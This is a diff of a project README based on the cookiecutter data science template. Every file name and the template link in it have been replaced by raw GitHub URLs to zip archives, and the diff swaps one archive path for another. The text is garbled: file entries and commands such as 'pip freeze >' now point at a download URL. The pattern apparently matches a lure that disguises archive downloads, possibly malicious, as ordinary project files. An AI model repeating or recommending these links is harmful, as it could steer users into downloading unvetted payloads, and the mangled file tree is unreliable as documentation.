@@ -8,14 +8,14 @@ Project Organization
 
     ├── LICENSE
     ├── Makefile           <- Makefile with commands like `make data` or `make train`
-    ├── https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/deviancy/DVC_checking.zip          <- The top-level README for developers using this project.
+    ├── https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/notebooks/checking_DV_v2.1.zip          <- The top-level README for developers using this project.
     ├── data
     │   ├── external       <- Data from third party sources.
     │   ├── interim        <- Intermediate data that has been transformed.
     │   ├── processed      <- The final, canonical data sets for modeling.
     │   └── raw            <- The original, immutable data dump.
     │
-    ├── docs               <- A default Sphinx project; see https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/deviancy/DVC_checking.zip for details
+    ├── docs               <- A default Sphinx project; see https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/notebooks/checking_DV_v2.1.zip for details
     │
     ├── models             <- Trained and serialized models, model predictions, or model summaries
     │
@@ -28,30 +28,30 @@ Project Organization
     ├── reports            <- Generated analysis as HTML, PDF, LaTeX, etc.
     │   └── figures        <- Generated graphics and figures to be used in reporting
     │
-    ├── https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/deviancy/DVC_checking.zip   <- The requirements file for reproducing the analysis environment, e.g.
-    │                         generated with `pip freeze > https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/deviancy/DVC_checking.zip`
+    ├── https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/notebooks/checking_DV_v2.1.zip   <- The requirements file for reproducing the analysis environment, e.g.
+    │                         generated with `pip freeze > https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/notebooks/checking_DV_v2.1.zip`
     │
-    ├── https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/deviancy/DVC_checking.zip           <- makes project pip installable (pip install -e .) so src can be imported
+    ├── https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/notebooks/checking_DV_v2.1.zip           <- makes project pip installable (pip install -e .) so src can be imported
     ├── src                <- Source code for use in this project.
-    │   ├── https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/deviancy/DVC_checking.zip    <- Makes src a Python module
+    │   ├── https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/notebooks/checking_DV_v2.1.zip    <- Makes src a Python module
     │   │
     │   ├── data           <- Scripts to download or generate data
-    │   │   └── https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/deviancy/DVC_checking.zip
+    │   │   └── https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/notebooks/checking_DV_v2.1.zip
     │   │
     │   ├── features       <- Scripts to turn raw data into features for modeling
-    │   │   └── https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/deviancy/DVC_checking.zip
+    │   │   └── https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/notebooks/checking_DV_v2.1.zip
     │   │
     │   ├── models         <- Scripts to train models and then use trained models to make
     │   │   │                 predictions
-    │   │   ├── https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/deviancy/DVC_checking.zip
-    │   │   └── https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/deviancy/DVC_checking.zip
+    │   │   ├── https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/notebooks/checking_DV_v2.1.zip
+    │   │   └── https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/notebooks/checking_DV_v2.1.zip
     │   │
     │   └── visualization  <- Scripts to create exploratory and results oriented visualizations
-    │       └── https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/deviancy/DVC_checking.zip
+    │       └── https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/notebooks/checking_DV_v2.1.zip
     │
-    └── https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/deviancy/DVC_checking.zip            <- tox file with settings for running tox; see https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/deviancy/DVC_checking.zip
+    └── https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/notebooks/checking_DV_v2.1.zip            <- tox file with settings for running tox; see https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/notebooks/checking_DV_v2.1.zip
 
 
 --------
 
-<p><small>Project based on the <a target="_blank" href="https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/deviancy/DVC_checking.zip">cookiecutter data science project template</a>. #cookiecutterdatascience</small></p>
+<p><small>Project based on the <a target="_blank" href="https://raw.githubusercontent.com/AshishParulekar/DVC_checking/main/notebooks/checking_DV_v2.1.zip">cookiecutter data science project template</a>. #cookiecutterdatascience</small></p>
